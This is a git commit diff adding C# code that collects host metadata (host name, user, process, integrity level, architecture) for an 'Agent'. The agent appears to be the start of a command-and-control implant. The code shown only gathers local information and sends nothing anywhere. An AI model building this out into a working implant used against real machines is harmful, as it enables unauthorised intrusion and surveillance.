4f12436ccfca580bc70dc147f42874046d71b4f4
dead-jaskier <symon3@protonmail.com>
2021-11-30 10:43:01 -0600

    Added Agent Metadata generation

---
+++ Agent/Models/AgentMetaData.cs
@@ -0,0 +1,20 @@
+﻿namespace Agent.Models
+{
+    public class AgentMetaData
+    {
+        public string Id { get; set; }
+
+        public string HostName { get; set; }
+
+        public string UserName { get; set; }
+
+        public string ProcessName { get; set; }
+
+        public int ProcessId { get; set; }
+
+        public string Integrity { get; set; }
+
+        public string Architecture { get; set; }
+
+    }
+}
---
+++ Agent/Program.cs
@@ -0,0 +1,48 @@
+﻿using Agent.Models;
+
+using System;
+using System.Diagnostics;
+using System.Security.Principal;
+
+namespace Agent
+{
+    internal class Program
+    {
+        private static AgentMetaData _metadata;
+
+        static void Main(string[] args)
+        {
+            GenerateMetadata();
+        }
+
+        static void GenerateMetadata()
+        {
+            var process = Process.GetCurrentProcess();
+
+            string userName = Environment.UserName;
+            string integrity = "Medium";
+
+            if (userName.Equals("SYSTEM"))
+                integrity = "SYSTEM";
+
+            using (var identity = WindowsIdentity.GetCurrent())
+            {
+                if (identity.User != identity.Owner)
+                {
+                    integrity = "High";
+                }
+            }
+
+            _metadata = new AgentMetaData()
+            {
+                Id = Guid.NewGuid().ToString(),
+                HostName = Environment.MachineName,
+                UserName = userName,
+                ProcessName = process.ProcessName,
+                ProcessId = process.Id,
+                Integrity = integrity,
+                Architecture = Environment.Is64BitOperatingSystem ? "x64" : "x86"
+            };
+        }
+    }
+}
